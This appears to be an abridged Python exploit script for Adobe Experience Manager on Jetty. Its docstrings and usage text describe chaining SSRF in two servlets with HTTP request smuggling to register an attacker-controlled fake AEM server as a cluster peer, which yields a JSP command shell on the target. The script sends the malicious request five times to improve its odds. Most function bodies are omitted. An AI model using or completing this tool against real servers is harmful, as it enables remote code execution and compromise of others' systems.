#!/usr/bin/env python3
"""
AEM SSRF-to-RCE exploit helper.

Exploits SSRF via SitecatalystServlet or AutoprovisioningServlet to achieve
Remote Code Execution on AEM instances running Jetty (before AEM 6.2-SP1-CFP7).

The attack uses HTTP request smuggling through the SSRF to inject a topology
connector announcement that registers the fake AEM server (--fakeaem) as a
cluster peer.  After replication, a JSP shell is accessible at:

    https://<target>/rcenode.html?<token>=<command>

Requires:
  - aem_server.py running on --fakeaem host (port 80)
  - response.bin in the same directory as aem_server.py

Usage:
    python3 aem_ssrf2rce.py --url https://aem.example.com/libs/cq/analytics/... \\
                             --fakeaem your.vps.ip [--proxy http://127.0.0.1:8080]
"""
...
def http_request(url, method="GET", data=None, additional_headers=None, proxy=None):
    ...
    SSL verification is disabled intentionally. Redirects are not followed.
    """
    headers = {
...
def exploit(url, fakeaem, proxy=None):
    """Send the SSRF-based topology connector payload to register fakeaem as a cluster peer.

    Sends the malicious request 5 times to increase the chance of successful exploitation.
    """
...
def main():
    """Entry point: parse arguments and run the SSRF-to-RCE exploit."""
    args = parse_args()
